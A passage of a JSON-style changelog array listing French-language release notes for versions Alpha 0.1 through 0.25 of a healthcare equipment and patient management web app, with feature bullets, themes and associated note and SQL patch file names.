    "themes": [
      "pwa",
      "ux",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.25.0.html"
  },
  {
    "v": "0.24.0",
    "kind": "version",
    "titre": "Resend API · Auto-archivage 6 mois · Export CSV audit annuel",
    "chantiers": [
      {
        "code": "•",
        "txt": "📧 Email DPO via Resend API (HTML brandé)"
      },
      {
        "code": "•",
        "txt": "📦 Auto-archivage cron mensuel"
      },
      {
        "code": "•",
        "txt": "📊 Export CSV audit annuel"
      },
      {
        "code": "•",
        "txt": "⚙️ Seuil archivage configurable par collectivité"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL + 1 Edge Function"
      }
    ],
    "themes": [
      "audit",
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.24.0.html",
    "sqlFile": "aveho-PATCH-vers-0.24.sql"
  },
  {
    "v": "0.23.0",
    "kind": "version",
    "titre": "Cron renouvellement quotidien · Audit scans QR · Durée de validité configurable",
    "chantiers": [
      {
        "code": "•",
        "txt": "⏰ Cron quotidien renouvellement (push + webhook + email DPO)"
      },
      {
        "code": "•",
        "txt": "🔍 Page admin audit scans QR"
      },
      {
        "code": "•",
        "txt": "⚙️ Durée validité configurable (1/2/3/5/10 ans)"
      },
      {
        "code": "•",
        "txt": "📧 Email DPO HTML brandé Aveho"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL + 1 Edge Function"
      }
    ],
    "themes": [
      "audit",
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.23.0.html",
    "sqlFile": "aveho-PATCH-vers-0.23.sql"
  },
  {
    "v": "0.22.0",
    "kind": "version",
    "titre": "PDF avec signature intégrée · QR code de vérification · Renouvellement automatique 3 ans",
    "chantiers": [
      {
        "code": "•",
        "txt": "📄 Export PDF complet avec signature image"
      },
      {
        "code": "•",
        "txt": "🔍 QR code de vérification d'intégrité"
      },
      {
        "code": "•",
        "txt": "🌐 Page publique /verifier (anonyme)"
      },
      {
        "code": "•",
        "txt": "⏰ Date d'expiration auto (3 ans)"
      },
      {
        "code": "•",
        "txt": "🔔 Filtre \"À renouveler\" + alertes 30j"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (193 lignes)"
      }
    ],
    "themes": [
      "divers"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.22.0.html",
    "sqlFile": "aveho-PATCH-vers-0.22.sql"
  },
  {
    "v": "0.21.0",
    "kind": "version",
    "titre": "Consentement RGPD complet · Signature électronique tactile + WebHID · Hash SHA-256 + Storage privé",
    "chantiers": [
      {
        "code": "•",
        "txt": "🛡️ Consentement RGPD générique santé à domicile"
      },
      {
        "code": "•",
        "txt": "✍️ Pavé de signature tactile (Pointer Events)"
      },
      {
        "code": "•",
        "txt": "🔌 Détection signpads externes via WebHID"
      },
      {
        "code": "•",
        "txt": "🔐 Hash SHA-256 + Storage privé Supabase"
      },
      {
        "code": "•",
        "txt": "📋 Page /consentements avec filtres &amp; archivage"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL + 1 bucket Storage"
      }
    ],
    "themes": [
      "rgpd",
      "infrastructure"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.21.0.html",
    "sqlFile": "aveho-PATCH-vers-0.21.sql"
  },
  {
    "v": "0.20.0",
    "kind": "version",
    "titre": "Full-text search Postgres · Notifs push regroupées · Recherche dans liste membres",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔍 Recherche full-text accent-insensitive"
      },
      {
        "code": "•",
        "txt": "⚡ Index GIN sur patients + matériels"
      },
      {
        "code": "•",
        "txt": "🔔 Push notifs regroupées par tag"
      },
      {
        "code": "•",
        "txt": "👥 Recherche dans liste membres"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (111 lignes)"
      }
    ],
    "themes": [
      "notifications",
      "patients",
      "perf_qualite",
      "transferts",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.20.0.html",
    "sqlFile": "aveho-PATCH-vers-0.20.sql"
  },
  {
    "v": "0.19.0",
    "kind": "version",
    "titre": "67 tests Vitest · Audit mode sombre 0.16-0.18 · Lazy load modules lourds · pageSize configurable · content-visibility",
    "chantiers": [
      {
        "code": "•",
        "txt": "🌓 Mode sombre complet (UM, FilterBar, Tooltip…)"
      },
      {
        "code": "•",
        "txt": "📦 -44% bundle fiche matériel/patient"
      },
      {
        "code": "•",
        "txt": "🔢 pageSize configurable (25/50/100/Tout)"
      },
      {
        "code": "•",
        "txt": "⚡ content-visibility sur les tables"
      }
    ],
    "themes": [
      "audit",
      "patients",
      "perf_qualite",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.19.0.html"
  },
  {
    "v": "0.18.0",
    "kind": "version",
    "titre": "Tests Vitest (34 tests) · Refactor pdfPreview blob URL · Audit a11y (focus, ARIA, skip-link) · NotifBell mutualisé",
    "chantiers": [
      {
        "code": "•",
        "txt": "🧹 document.write supprimé partout"
      },
      {
        "code": "•",
        "txt": "♿ Focus visible accessible"
      },
      {
        "code": "•",
        "txt": "🪪 Skip-link au contenu principal"
      },
      {
        "code": "•",
        "txt": "🔄 NotifBell utilise relativeTime partagé"
      },
      {
        "code": "•",
        "txt": "🔒 Focus trap dans les modales"
      }
    ],
    "themes": [
      "ux",
      "audit",
      "notifications",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.18.0.html"
  },
  {
    "v": "0.17.1",
    "kind": "version",
    "titre": "Push VAPID · Webhooks Teams &amp; Slack · Tri Kanban par échéance · relativeTime mutualisé",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔔 Push notifications VAPID"
      },
      {
        "code": "•",
        "txt": "🟦 Webhook Microsoft Teams"
      },
      {
        "code": "•",
        "txt": "🟪 Webhook Slack"
      },
      {
        "code": "•",
        "txt": "📅 Tri Kanban par échéance"
      },
      {
        "code": "•",
        "txt": "♻️ relativeTime extrait dans lib/format"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL + 2 Edge Functions"
      }
    ],
    "themes": [
      "notifications"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.17.1.html",
    "sqlFile": "aveho-PATCH-vers-0.17.1.sql"
  },
  {
    "v": "0.17.0",
    "kind": "version",
    "titre": "Drag tactile Kanban (Pointer Events) · Échéance DI saisissable · Pastilles d'activité utilisateurs · Notes 0.12-0.14 enrichies",
    "chantiers": [
      {
        "code": "•",
        "txt": "📱 Drag tactile Kanban"
      },
      {
        "code": "•",
        "txt": "📅 Échéance DI dans la modale"
      },
      {
        "code": "•",
        "txt": "🟢 \"En ligne il y a X\" sur membres"
      },
      {
        "code": "•",
        "txt": "📚 Notes 0.12 · 0.13 · 0.14 enrichies"
      },
      {
        "code": "•",
        "txt": "🚫 0 dépendance npm ajoutée"
      }
    ],
    "themes": [
      "ux",
      "documentation"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.17.0.html"
  },
  {
    "v": "0.16.1",
    "kind": "version",
    "titre": "",
    "chantiers": [
      {
        "code": "•",
        "txt": "⚙️ Auto-rattachement admin (2 triggers SQL)"
      },
      {
        "code": "•",
        "txt": "📅 due_date rétabli"
      },
      {
        "code": "•",
        "txt": "🛒 Commander un remplacement"
      },
      {
        "code": "•",
        "txt": "🏷️ 10 étiquettes par défaut seedées"
      },
      {
        "code": "•",
        "txt": "🧩 Composant FilterBar partagé"
      },
      {
        "code": "•",
        "txt": "💬 Tooltips fiche matériel"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (178 lignes)"
      }
    ],
    "themes": [
      "achats",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.16.1.html",
    "sqlFile": "aveho-PATCH-vers-0.16.1.sql"
  },
  {
    "v": "0.16.0",
    "kind": "version",
    "titre": "UserMenu (desktop + mobile) · Archivage utilisateurs · Modale infos enrichie · Tooltips fiche patient",
    "chantiers": [
      {
        "code": "•",
        "txt": "👤 UserMenu avec avatar + nom"
      },
      {
        "code": "•",
        "txt": "📱 Bottom-sheet mobile"
      },
      {
        "code": "•",
        "txt": "🗂️ Archivage utilisateurs"
      },
      {
        "code": "•",
        "txt": "📊 Stats d'activité par user"
      },
      {
        "code": "•",
        "txt": "💬 Tooltips réutilisables"
      },
      {
        "code": "•",
        "txt": "🔧 1 patch SQL (4 colonnes + 1 vue)"
      }
    ],
    "themes": [
      "ux",
      "patients",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.16.0.html",
    "sqlFile": "aveho-PATCH-vers-0.16.sql"
  },
  {
    "v": "0.15.6",
    "kind": "version",
    "titre": "",
    "chantiers": [
      {
        "code": "•",
        "txt": "🛒 Module Achats (workflow 7 statuts)"
      },
      {
        "code": "•",
        "txt": "⌘K Préfixes p:/m:/d:/s:/a:"
      },
      {
        "code": "•",
        "txt": "📰 Journal d'activité"
      },
      {
        "code": "•",
        "txt": "📊 Export Excel multi-feuille"
      },
      {
        "code": "•",
        "txt": "⚠️ 8 pièges connus documentés"
      },
      {
        "code": "•",
        "txt": "🔧 2 scripts SQL livrés"
      },
      {
        "code": "•",
        "txt": "🔥 6 hotfix post-livraison"
      }
    ],
    "themes": [
      "achats",
      "transferts",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.15.6.html"
  },
  {
    "v": "0.15.1",
    "kind": "version",
    "titre": "",
    "chantiers": [
      {
        "code": "•",
        "txt": "🛒 Module Achats (workflow 7 statuts)"
      },
      {
        "code": "•",
        "txt": "⌘K Préfixes p:/m:/d:/s:/a:"
      },
      {
        "code": "•",
        "txt": "📰 Journal d'activité"
      },
      {
        "code": "•",
        "txt": "📊 Export Excel multi-feuille"
      },
      {
        "code": "•",
        "txt": "⚠️ Pièges connus documentés"
      },
      {
        "code": "•",
        "txt": "🔧 Script PATCH consolidé"
      },
      {
        "code": "•",
        "txt": "🔥 Hotfix 0.15.1 : Journal corrigé"
      }
    ],
    "themes": [
      "achats",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.15.1.html"
  },
  {
    "v": "0.15",
    "kind": "version",
    "titre": "",
    "chantiers": [
      {
        "code": "•",
        "txt": "🛒 Module Achats (workflow 7 statuts)"
      },
      {
        "code": "•",
        "txt": "⌘K Préfixes p:/m:/d:/s:/a:"
      },
      {
        "code": "•",
        "txt": "📰 Journal d'activité"
      },
      {
        "code": "•",
        "txt": "📊 Export Excel multi-feuille"
      },
      {
        "code": "•",
        "txt": "⚠️ Pièges connus documentés"
      },
      {
        "code": "•",
        "txt": "🔧 Script PATCH consolidé"
      },
      {
        "code": "•",
        "txt": "🔥 Hotfix 0.15.1 : Journal corrigé"
      }
    ],
    "themes": [
      "achats",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.15.html",
    "sqlFile": "aveho-PATCH-vers-0.15.sql"
  },
  {
    "v": "0.14",
    "kind": "version",
    "titre": "Imprimer les fiches · Aperçu impression Stats · Recherche globale Cmd+K · Vue Kanban DI",
    "chantiers": [
      {
        "code": "•",
        "txt": "🖨️ Imprimer fiches patient & matériel"
      },
      {
        "code": "•",
        "txt": "📄 Aperçu impression Stats"
      },
      {
        "code": "•",
        "txt": "⌘K Recherche globale"
      },
      {
        "code": "•",
        "txt": "📋 Vue Kanban DI"
      },
      {
        "code": "•",
        "txt": "🏷️ Étiquettes patient sur fiche"
      }
    ],
    "themes": [
      "patients",
      "stats_dashboard",
      "transferts",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.14.html"
  },
  {
    "v": "0.13",
    "kind": "version",
    "titre": "Fiche patient 360° · Stats signalements · Filtres combinés · Mode auto jour/nuit · Aperçu impression A4",
    "chantiers": [
      {
        "code": "•",
        "txt": "👤 Fiche patient 360°"
      },
      {
        "code": "•",
        "txt": "📊 Stats signalements"
      },
      {
        "code": "•",
        "txt": "🔍 Filtres combinés Matériels"
      },
      {
        "code": "•",
        "txt": "🌗 Mode auto jour/nuit"
      },
      {
        "code": "•",
        "txt": "🖨️ Aperçu impression A4"
      }
    ],
    "themes": [
      "patients",
      "stats_dashboard",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.13.html"
  },
  {
    "v": "0.12",
    "kind": "version",
    "titre": "Fiche matériel 360° · Export PDF planning · Stats Maintenance · Signalements anonymes · Cron quotidien",
    "chantiers": [
      {
        "code": "•",
        "txt": "📋 Fiche matériel 360°"
      },
      {
        "code": "•",
        "txt": "📄 Export PDF planning"
      },
      {
        "code": "•",
        "txt": "📊 Stats Maintenance"
      },
      {
        "code": "•",
        "txt": "💬 Signalements anonymes"
      },
      {
        "code": "•",
        "txt": "⏰ Cron quotidien Supabase"
      },
      {
        "code": "•",
        "txt": "⚠ Nouveau script SQL + Edge Function"
      }
    ],
    "themes": [
      "maintenance",
      "stats_dashboard",
      "transferts",
      "infrastructure"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.12.html"
  },
  {
    "v": "0.11",
    "kind": "version",
    "titre": "Lien Maintenance↔DI · Maintenances récurrentes · Notifs J-7 · Tags matériel · Maintenances dans calendrier",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔗 Lien Maintenance ↔ DI auto"
      },
      {
        "code": "•",
        "txt": "🔁 Maintenances récurrentes"
      },
      {
        "code": "•",
        "txt": "🔔 Notifs J-7"
      },
      {
        "code": "•",
        "txt": "🏷️ Tags matériel"
      },
      {
        "code": "•",
        "txt": "📅 Maintenances dans calendrier"
      },
      {
        "code": "•",
        "txt": "⚠ Nouveau script SQL requis"
      }
    ],
    "themes": [
      "notifications",
      "maintenance",
      "transferts"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.11.html"
  },
  {
    "v": "0.10",
    "kind": "version",
    "titre": "Maintenance préventive · Calendrier vue semaine · Filtre étiquette · Mode kiosque · Mode lecture seule",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔧 Maintenance préventive"
      },
      {
        "code": "•",
        "txt": "📅 Calendrier vue semaine"
      },
      {
        "code": "•",
        "txt": "🏷️ Filtre par étiquette"
      },
      {
        "code": "•",
        "txt": "🖥️ Mode kiosque"
      },
      {
        "code": "•",
        "txt": "👁️ Mode lecture seule"
      },
      {
        "code": "•",
        "txt": "⚠ Nouveau script SQL requis"
      }
    ],
    "themes": [
      "maintenance"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.10.html"
  },
  {
    "v": "0.9",
    "kind": "version",
    "titre": "Sélection multiple · Calendrier DI · Étiquettes patients · Comparaison inter-établissements",
    "chantiers": [
      {
        "code": "•",
        "txt": "☑️ Sélection multiple + bulk actions"
      },
      {
        "code": "•",
        "txt": "📅 Calendrier DI mensuel"
      },
      {
        "code": "•",
        "txt": "🏷️ Étiquettes patients"
      },
      {
        "code": "•",
        "txt": "⚖️ Comparaison inter-étab"
      },
      {
        "code": "•",
        "txt": "⚠ Nouveau script SQL requis"
      }
    ],
    "themes": [
      "patients",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.9.html"
  },
  {
    "v": "0.8",
    "kind": "version",
    "titre": "Tri colonnes · Pagination · Filtres avancés étendus · Export PDF stats · Recherche fulltext historique",
    "chantiers": [
      {
        "code": "•",
        "txt": "↕️ Tri colonnes (toutes listes Crud)"
      },
      {
        "code": "•",
        "txt": "📄 Pagination 50/page"
      },
      {
        "code": "•",
        "txt": "🔍 Filtres avancés Articles + Matériels"
      },
      {
        "code": "•",
        "txt": "📊 Export PDF Statistiques"
      },
      {
        "code": "•",
        "txt": "🔎 Recherche fulltext Historique"
      }
    ],
    "themes": [
      "audit",
      "stats_dashboard",
      "transferts",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.8.html"
  },
  {
    "v": "0.7",
    "kind": "version",
    "titre": "Statistiques · Import CSV · Mode foncé · Filtres avancés · Réorganisation widgets",
    "chantiers": [
      {
        "code": "•",
        "txt": "📊 Nouvelle page Statistiques"
      },
      {
        "code": "•",
        "txt": "📥 Import CSV"
      },
      {
        "code": "•",
        "txt": "🌙 Mode foncé"
      },
      {
        "code": "•",
        "txt": "🔍 Filtres avancés Patients"
      },
      {
        "code": "•",
        "txt": "↕️ Widgets réordonnables"
      }
    ],
    "themes": [
      "patients",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.7.html"
  },
  {
    "v": "0.6",
    "kind": "version",
    "titre": "Mode hors-ligne PWA · Assignation DI · Dashboard personnalisable · Libellés métier complets",
    "chantiers": [
      {
        "code": "•",
        "txt": "📡 Mode hors-ligne consultation"
      },
      {
        "code": "•",
        "txt": "🎯 Notifs ciblées effectives"
      },
      {
        "code": "•",
        "txt": "⚙️ Dashboard configurable"
      },
      {
        "code": "•",
        "txt": "⚠ Test interne"
      }
    ],
    "themes": [
      "pwa",
      "notifications",
      "perf_qualite",
      "stats_dashboard"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.6.html"
  },
  {
    "v": "0.5",
    "kind": "version",
    "titre": "RLS étanche · Profil utilisateur · Logs de connexion · Libellés propagés · Filtres temporels",
    "chantiers": [
      {
        "code": "•",
        "txt": "🔒 RLS étanche par établissement"
      },
      {
        "code": "•",
        "txt": "⚠ Test interne"
      }
    ],
    "themes": [
      "audit",
      "rls_securite",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.5.html"
  },
  {
    "v": "0.4",
    "kind": "version",
    "titre": "Notifications auto · Audit log · Libellés métier appliqués · Export PDF · Droits étendus",
    "chantiers": [
      {
        "code": "•",
        "txt": "✓ Notifications maintenant peuplées"
      },
      {
        "code": "•",
        "txt": "⚠ Test interne"
      }
    ],
    "themes": [
      "audit",
      "notifications",
      "rls_securite",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.4.html"
  },
  {
    "v": "0.3",
    "kind": "version",
    "titre": "Notifications · Recherche globale · Export CSV · Paramètres collectivité · Droits étendus",
    "chantiers": [
      {
        "code": "•",
        "txt": "⚠ Test interne"
      }
    ],
    "themes": [
      "notifications",
      "rls_securite",
      "perf_qualite",
      "recherche"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.3.html"
  },
  {
    "v": "0.2",
    "kind": "version",
    "titre": "Édition de la hiérarchie · Système UI unifié · Application des droits · Décrément stock auto",
    "chantiers": [
      {
        "code": "•",
        "txt": "✓ Système UI unifié"
      },
      {
        "code": "•",
        "txt": "✓ Droits effectifs"
      },
      {
        "code": "•",
        "txt": "⚠ Test interne"
      }
    ],
    "themes": [
      "rls_securite",
      "perf_qualite"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.2.html"
  },
  {
    "v": "0.1",
    "kind": "version",
    "titre": "Première version fonctionnelle déployée — du local au cloud, avec emails actifs",
    "chantiers": [
      {
        "code": "•",
        "txt": "✓ Déployée Vercel"
      },
      {
        "code": "•",
        "txt": "✓ Base Supabase"
      },
      {
        "code": "•",
        "txt": "✓ PWA installable"
      },
      {
        "code": "•",
        "txt": "✓ Emails Resend"
      },
      {
        "code": "•",
        "txt": "⚠ Test interne uniquement"
      }
    ],
    "themes": [
      "pwa",
      "notifications",
      "perf_qualite",
      "infrastructure"
    ],
    "date": "31 mai 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.1.html"
  }
];
